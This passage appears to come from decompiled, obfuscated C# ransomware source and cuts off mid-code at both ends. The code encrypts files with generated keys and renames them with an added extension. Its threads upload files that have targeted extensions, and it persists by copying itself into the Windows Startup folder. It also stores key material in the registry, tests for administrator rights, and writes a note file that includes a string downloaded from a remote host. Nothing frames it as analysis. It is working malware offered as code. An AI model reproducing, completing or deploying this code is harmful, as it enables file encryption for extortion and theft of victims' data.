									}
									File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc);
								}
							}
							catch (Exception ex6)
							{
								if (YGBzDBzlDVGPdcyT)
								{
									try
									{
										File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107402645) + ex6.Message + getString_0(107396590));
									}
									catch (Exception)
									{
									}
								}
								IwoWsCVOvNqeRACr++;
								return;
							}
							if (ApXJMbmTnc != getString_0(107386067))
							{
								CS_0024_003C_003E8__locals0.HDYHoqvFVoE += ApXJMbmTnc;
							}
							if (KsYUZJCeItFet == getString_0(107396791))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in rSxQCGHPFw)
									{
										if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == hjDtcmdkFEUCoUqO.getString_0(107396797))
										{
											if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length)
											{
												try
												{
													PRbKLyXwxCMy.KUjtevBxHIDiZB(hjDtcmdkFEUCoUqO.getString_0(107390425), hjDtcmdkFEUCoUqO.getString_0(107390420), hjDtcmdkFEUCoUqO.getString_0(107390439), CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().EndsWith(item) && BTmYNKJoWXy == hjDtcmdkFEUCoUqO.getString_0(107397086))
										{
											try
											{
												PRbKLyXwxCMy.KUjtevBxHIDiZB(hjDtcmdkFEUCoUqO.getString_0(107390425), hjDtcmdkFEUCoUqO.getString_0(107390420), hjDtcmdkFEUCoUqO.getString_0(107390439), CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
							string text2 = getString_0(107390370);
							text2 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : getString_0(107390370));
							string s = pmEBRznCyJCsrx.otEPbnvZbIA(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (uZGrkbWLHwtb == getString_0(107397080))
							{
								byte[] array2 = null;
								byte[] byte_ = PywWzStJmnOP.qDPulRCUpTwRa(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, Convert.ToInt32(kituZbADEtf) * 1024 * 1024);
								if (!PywWzStJmnOP.eZPzeLHBKntVHTM(VfjTsBqJDSVT: (!ToytCwhuOZ) ? (TTTJwfHUqgyKmj ? PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(aVkwyftWjF), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TTTJwfHUqgyKmj ? LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(aVkwyftWjF), Convert.FromBase64String(UQzJrkNAgAyNPg))), eDBBwAsYeVCx: CS_0024_003C_003E8__locals0.HDYHoqvFVoE, EeTyBkmkZsu: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!TTTJwfHUqgyKmj)
							{
								if (!xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, kituZbADEtf, aVkwyftWjF, null, Convert.FromBase64String(UQzJrkNAgAyNPg)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, kituZbADEtf, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (izNvindkdEa)
							{
								ApXJMbmTnc = PDiDpTsAaoZu + ApXJMbmTnc;
							}
							string text3 = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
							string text4 = getString_0(107390370);
							text4 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : getString_0(107390370));
							string s2 = pmEBRznCyJCsrx.otEPbnvZbIA(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (ApXJMbmTnc != getString_0(107386067))
							{
								if (!lMzMCwfLjdb)
								{
									if (!TTTJwfHUqgyKmj)
									{
										tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, ZWfNLTTCJEsBadr);
									}
									else
									{
										tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!TTTJwfHUqgyKmj)
										{
											xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
										}
										else
										{
											xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (YGBzDBzlDVGPdcyT)
										{
											try
											{
												File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107386085) + ex11.Message + getString_0(107396590));
											}
											catch (Exception)
											{
											}
										}
										IwoWsCVOvNqeRACr++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!lMzMCwfLjdb)
							{
								if (!TTTJwfHUqgyKmj)
								{
									tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107386062), ZWfNLTTCJEsBadr);
								}
								else
								{
									tjNNgredhuoLn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107386062), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!TTTJwfHUqgyKmj)
									{
										xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
									}
									else
									{
										xupzWdtCvyjPfw(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, CS_0024_003C_003E8__locals0.HDYHoqvFVoE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (YGBzDBzlDVGPdcyT)
									{
										try
										{
											File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107386085) + ex14.Message + getString_0(107396590));
										}
										catch (Exception)
										{
										}
									}
									IwoWsCVOvNqeRACr++;
									return;
								}
							}
							if (TTTJwfHUqgyKmj)
							{
								if (ApXJMbmTnc != getString_0(107386067))
								{
									TnxDxZQzabkSS(CS_0024_003C_003E8__locals0.HDYHoqvFVoE + ApXJMbmTnc, bytes2);
								}
								else
								{
									TnxDxZQzabkSS(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			fUBdEKZyHcMt.Remove(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
		}

		static VQdrzQouGeJmOOKE()
		{
			Strings.CreateGetStringDelegate(typeof(VQdrzQouGeJmOOKE));
		}
	}

	private sealed class wTSZYsFYaqEX
	{
		public string ayhKFIQnjViRHWz;

		public string MczmtGUvSer;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(ayhKFIQnjViRHWz);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(MczmtGUvSer))
					{
						File.Delete(MczmtGUvSer);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string VtHzXiXBnEZtf;

	public static byte[] ZWfNLTTCJEsBadr;

	public static string RitzjDPaNqQZW;

	public static string GpINWHpOESmKHe;

	public static List<string> apDawShQCtslB;

	public static List<string> rEHzfEbajTTFtILxW;

	public static string XzalRzzKGqDOKT;

	public static string aVkwyftWjF;

	public static string UQzJrkNAgAyNPg;

	public static string WKjyaCaelLg;

	public static string eLRnyKDcFq;

	public static int GXVkvUxdIOdmn;

	public static string VtgyThVicrA;

	public static string ukLuocueQQQXY;

	public static string rxSfpIhvqF;

	public static string lRaPiSKlPUxvw;

	public static string tXLHjLdojQx;

	public static string juVcejYzIk;

	public static string KzsyQHKxBduEMFeb;

	public static string vOZUFdRPio;

	public static List<string> JUgtXhMtNoYgxH;

	public static List<string> XhCnheiZHlf;

	public static string MWDrZamFHPm;

	public static string nxYvAWmpSDWZB;

	public static string RRixVNqQgAPXvBWM;

	public static List<string> kQacklGScvGB;

	public static string tVQlXTzRozdw;

	private static string uRGCEqdBoew;

	public static string ZYTlzkdcoENHWE;

	public static string NmRawCPGcaGnsk;

	public static List<string> VMPUjuVkUC;

	public static List<string> ukNYLlmoXdw;

	public static List<string> rLiTvUnMjZIoe;

	public static List<string> DOqIFjuGCgghi;

	public static string czSpNgGzTRaL;

	public static List<string> FxMScNAmcodLPVv;

	public static List<string> bLmwwFYKzGeYgm;

	public static string JvPfOpJrumHWYFWL;

	public static string AvzXeevRKl;

	internal static DateTime mYxFjibColhJe;

	internal static DateTime pPQIBESJDAyXxxF;

	public static string DVGbUCJGnq;

	public static string kituZbADEtf;

	public static string arUCDEwwIuob;

	public static string eVCkeLViiuxqzM;

	public static string MsdEtYiKOHG;

	public static string jvJeGCseVN;

	public static string WdoApRVMsR;

	public static string KsYUZJCeItFet;

	public static List<string> rSxQCGHPFw;

	public static string BTmYNKJoWXy;

	public static string ZgtheUfHxbisWo;

	public static string iMvNzBfrcwmQp;

	public static string ZFufIjcSxgi;

	public static string yuKyUFXVTZR;

	public static string YGuCHWMRhhcSxPX;

	public static string sQTupgxNJRXxB;

	public static string ynfNInlWMPbmP;

	public static string KYTtjmbrnwcoW;

	public static string QoEJlIRixuXy;

	public static string IhGhEkurggvV;

	public static string GcBTrKPLTAeR;

	public static string YJtohhhbqwtybb;

	public static string yjxvVDmYnvw;

	public static string EWTDSRnWdq;

	public static string gYQMwvgElzG;

	public static string VuBpwpfFQIC;

	public static string aNXUgHehaHt;

	public static string gTZuLexkwyqfA;

	public static string vyePyvbVLbeEqa;

	public static string OrPntKgMIF;

	public static string cdPhSZZcynpMoIp;

	public static string bhpkuvVWHsXIIU;

	public static string CiDFpEFgxOlMKoBn;

	public static string tvwWJjGBYOWepj;

	public static string IGTubLLdghcxfQ;

	public static string uZGrkbWLHwtb;

	public static string TotopLXkyZxaqM;

	public static string RrsXTdLJJRIMoA;

	public static string[] BBUuyXfOREW;

	public static string cAsAngUTSsddb;

	public static bool ToytCwhuOZ;

	public static string MJhhWuEvtXFgGh;

	public static bool TTTJwfHUqgyKmj;

	public static bool CpQVYQNkDhJp;

	public static bool iEHhdvUckGr;

	public static bool mDwgaDNBNLVR;

	public static string ZmxznfzcMXVgTR;

	public static bool YGBzDBzlDVGPdcyT;

	public static bool TnvuocWBOsGOy;

	public static bool DPdpIdpcPSaGV;

	public static bool xazslhOFeW;

	public static bool lMzMCwfLjdb;

	public static string xrvDxaCBctsjEXT;

	public static bool zZWgofEFsLDUuOW;

	public static Stopwatch cdDUPOgIkBzmqB;

	public static int IwoWsCVOvNqeRACr;

	public static int OSqubFtEdkqhb;

	public static bool izNvindkdEa;

	public static string PDiDpTsAaoZu;

	public static string[] PrXjuiSkUGK;

	public static List<string> EkwCuNFaGq;

	public static int RmKdlhAIesG;

	public static bool DTvMKyCnFvaC;

	public static bool RDGTMEgnrWWSrW;

	public static List<string> iXuYDVfYyJk;

	public static List<string> BWuIiWJEFM;

	public static List<string> vvNkOLnqec;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			VgvdrmsYlwjuFP CS_0024_003C_003E8__locals0 = new VgvdrmsYlwjuFP();
			CS_0024_003C_003E8__locals0.YyOJKretSgjh = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.YyOJKretSgjh) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			pPtMXekciNgRrG.ABoSFgyzRs(uRGCEqdBoew);
		}
		catch (Exception)
		{
		}
		try
		{
			if (IGTubLLdghcxfQ == getString_0(107396771))
			{
				Thread thread = new Thread(gtPwzsxKXI.bETgEEyMjawm);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (rxSfpIhvqF == getString_0(107396771))
		{
			Thread.Sleep(int.Parse(lRaPiSKlPUxvw));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && WdoApRVMsR == getString_0(107396771))
		{
			try
			{
				nGhdvVidhDbL(hcAHXMuOvto(getString_0(107396766)));
			}
			catch
			{
			}
		}
		try
		{
			if (KzsyQHKxBduEMFeb == getString_0(107396771) && vGaVuRuYBdxIZmNW.AIwPogEEtjzedd())
			{
				new HnUqtJRtPb().GAEuuRqStRLwXfQ(bool_0: false);
				vGaVuRuYBdxIZmNW.HxgFKbYuJWG();
			}
		}
		catch (Exception)
		{
		}
		if (nxYvAWmpSDWZB == getString_0(107396771) && vGaVuRuYBdxIZmNW.AIwPogEEtjzedd())
		{
			new HnUqtJRtPb().GAEuuRqStRLwXfQ(bool_0: false);
			new HnUqtJRtPb().lXkRXWsNvjykrj();
		}
		if (ukLuocueQQQXY == getString_0(107396771))
		{
			qYgNeADkcjABMs.xYBPOMMCJXmJ();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397173);
			string text2 = text + Path.GetFileName(fileName);
			if (eLRnyKDcFq == getString_0(107396771) && fileName != text2)
			{
				Thread thread2 = new Thread(rcFNAOatOm);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (XzalRzzKGqDOKT == getString_0(107396771) && mainModule != null && fileName != text2)
			{
				try
				{
					GXVkvUxdIOdmn = auYTntIUHozrxD(0, JUgtXhMtNoYgxH.Count);
					File.Copy(fileName, text + JUgtXhMtNoYgxH[GXVkvUxdIOdmn], overwrite: true);
					Process.Start(text + JUgtXhMtNoYgxH[GXVkvUxdIOdmn]);
					pQMSgvLMPHjEGO();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (JvPfOpJrumHWYFWL == getString_0(107396771) && DateTime.Now < mYxFjibColhJe)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (AvzXeevRKl == getString_0(107396771) && DateTime.Now > pPQIBESJDAyXxxF)
			{
				pQMSgvLMPHjEGO();
			}
		}
		catch
		{
		}
		tEjJZEmrPPLY();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = ukNYLlmoXdw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385980)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source2 = rLiTvUnMjZIoe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385999)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (RrsXTdLJJRIMoA == getString_0(107396771))
				{
					string[] bBUuyXfOREW = BBUuyXfOREW;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107385999)), getString_0(107386454) + string_0 + getString_0(107386477));
						};
					}
					Parallel.ForEach(bBUuyXfOREW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!PAnwnUZwtskZZp().Contains(getString_0(107386173)))
				{
					COmUeYeonfEGhi(czSpNgGzTRaL);
				}
				else
				{
					List<string> dOqIFjuGCgghi = DOqIFjuGCgghi;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							rNfIJaiTMyCx(hcAHXMuOvto(BSskXttzziY(getString_0(107386472))), string_0);
						};
					}
					Parallel.ForEach(dOqIFjuGCgghi, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> fxMScNAmcodLPVv = FxMScNAmcodLPVv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107386447)), string_0);
					};
				}
				Parallel.ForEach(fxMScNAmcodLPVv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397200))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397200)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397151)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !apDawShQCtslB.Contains(text6) && text6 != getString_0(107397162) && text6 != getString_0(107397109) && text6 != getString_0(107397088))
								{
									apDawShQCtslB.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397059)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397046))
						{
							YJtohhhbqwtybb = getString_0(107396771);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397069))
						{
							YJtohhhbqwtybb = getString_0(107397060);
						}
					}
					if (text3.Contains(getString_0(107397023)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397046))
						{
							zZWgofEFsLDUuOW = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397069))
						{
							zZWgofEFsLDUuOW = false;
						}
					}
					if (text3.Contains(getString_0(107397038)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397046))
						{
							YGBzDBzlDVGPdcyT = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397069))
						{
							YGBzDBzlDVGPdcyT = false;
						}
					}
					if (text3.Contains(getString_0(107396993)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397046))
						{
							DTvMKyCnFvaC = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397069))
						{
							DTvMKyCnFvaC = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107396996) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (YJtohhhbqwtybb == getString_0(107397060))
		{
			EIwysPYolVQ();
		}
		if (RDGTMEgnrWWSrW)
		{
			try
			{
				Console.WriteLine(getString_0(107396407));
				DdBaEZlbyTFA.UpZyAnrXDECk();
			}
			catch (Exception ex8)
			{
				if (YGBzDBzlDVGPdcyT)
				{
					try
					{
						File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107396354) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (YJtohhhbqwtybb == getString_0(107396771))
		{
			try
			{
				TSXSEaOaMSG();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && iEHhdvUckGr)
			{
				try
				{
					Thread thread4 = new Thread(uPNCNmymAv.FKLPXWFxnzp);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			rNfIJaiTMyCx(getString_0(107396309), hcAHXMuOvto(getString_0(107396328)));
		}
		if (MWDrZamFHPm == getString_0(107396771) && GbgzAXwzTuZOIzm() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(vdyuMWvrJcM.lJpdHahcKW);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = NmRawCPGcaGnsk == getString_0(107396771);
		SecureString secureString = new SecureString();
		if (arUCDEwwIuob == getString_0(107397060))
		{
			aVkwyftWjF = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
			UQzJrkNAgAyNPg = PXBlVMuKtjxUxD.NKBPlLpLanL();
		}
		else
		{
			aVkwyftWjF = getString_0(107396223);
		}
		WKjyaCaelLg = pmEBRznCyJCsrx.otEPbnvZbIA(aVkwyftWjF + UQzJrkNAgAyNPg);
		if (!TTTJwfHUqgyKmj)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(hcAHXMuOvto(getString_0(107396722)));
				if (registryKey != null)
				{
					registryKey.SetValue(hcAHXMuOvto(getString_0(107396677)) + (registryKey.ValueCount + 1), WKjyaCaelLg);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(hcAHXMuOvto(getString_0(107396722)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(hcAHXMuOvto(getString_0(107396677)) + (registryKey2.ValueCount + 1), WKjyaCaelLg);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (ynfNInlWMPbmP == getString_0(107396771))
		{
			LgkYyRNqrYEXQm();
		}
		if (DPdpIdpcPSaGV)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), xrvDxaCBctsjEXT)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), xrvDxaCBctsjEXT), string.Concat(hcAHXMuOvto(getString_0(107396636)), new WebClient().DownloadString(hcAHXMuOvto(getString_0(107396611))), getString_0(107396570), hcAHXMuOvto(getString_0(107396565)), DateTime.Now, getString_0(107396570), hcAHXMuOvto(getString_0(107396556)), WKjyaCaelLg));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), xrvDxaCBctsjEXT), getString_0(107396499) + WKjyaCaelLg);
				}
			}
			catch (Exception ex13)
			{
				if (YGBzDBzlDVGPdcyT)
				{
					try
					{
						File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107395926) + ex13.Message + getString_0(107396570));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		uoPfPeVTik.mfzelyWDStJIB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), vyePyvbVLbeEqa), IHSwKGrbCwqfhuq(WKjyaCaelLg), null, null, getString_0(107395909), getString_0(107395860), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			lMnoQYsugktngh();
		}
		try
		{
			try
			{
				if (zZWgofEFsLDUuOW)
				{
					Console.WriteLine(getString_0(107395843));
				}
			}
			catch
			{
			}
			LZpyrhFdYSXDh(new string[1] { getString_0(107395826) }, new string[100]
			{
				getString_0(107395817),
				getString_0(107395812),
				getString_0(107395775),
				getString_0(107395766),
				getString_0(107395793),
				getString_0(107395788),
				getString_0(107395783),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395736),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395749),
				getString_0(107395712),
				getString_0(107395703),
				getString_0(107395730),
				getString_0(107395725),
				getString_0(107395720),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396181),
				getString_0(107396208),
				getString_0(107396203),
				getString_0(107396198),
				getString_0(107396161),
				getString_0(107396156),
				getString_0(107396151),
				getString_0(107396178),
				getString_0(107396173),
				getString_0(107396168),
				getString_0(107396131),
				getString_0(107396126),
				getString_0(107396121),
				getString_0(107396116),
				getString_0(107396139),
				getString_0(107396134),
				getString_0(107396097),
				getString_0(107396092),
				getString_0(107395783),
				getString_0(107396087),
				getString_0(107395741),
				getString_0(107396110),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396063),
				getString_0(107396058),
				getString_0(107396053),
				getString_0(107396080),
				getString_0(107396075),
				getString_0(107396070),
				getString_0(107396033),
				getString_0(107396028),
				getString_0(107396023),
				getString_0(107396050),
				getString_0(107396045),
				getString_0(107396040),
				getString_0(107396003),
				getString_0(107395998),
				getString_0(107395989),
				getString_0(107396016),
				getString_0(107396007),
				getString_0(107395962),
				getString_0(107396087),
				getString_0(107395981),
				getString_0(107395972),
				getString_0(107395419),
				getString_0(107395442),
				getString_0(107395433),
				getString_0(107395392),
				getString_0(107395387),
				getString_0(107395410),
				getString_0(107395401),
				getString_0(107395360),
				getString_0(107395355),
				getString_0(107395350),
				getString_0(107395377),
				getString_0(107395372),
				getString_0(107395367),
				getString_0(107395330),
				getString_0(107395321),
				getString_0(107395316),
				getString_0(107395343),
				getString_0(107395338),
				getString_0(107395333),
				getString_0(107395296),
				getString_0(107395287),
				getString_0(107395310),
				getString_0(107395305),
				getString_0(107396121),
				getString_0(107395300),
				getString_0(107395263),
				getString_0(107395258),
				getString_0(107395253),
				getString_0(107395280),
				getString_0(107395271),
				getString_0(107395234),
				getString_0(107395229),
				getString_0(107395220),
				getString_0(107395247),
				getString_0(107395242)
			}, new string[0], aVkwyftWjF, getString_0(107395237));
		}
		catch (Exception ex15)
		{
			if (YGBzDBzlDVGPdcyT)
			{
				try
				{
					File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107395196) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
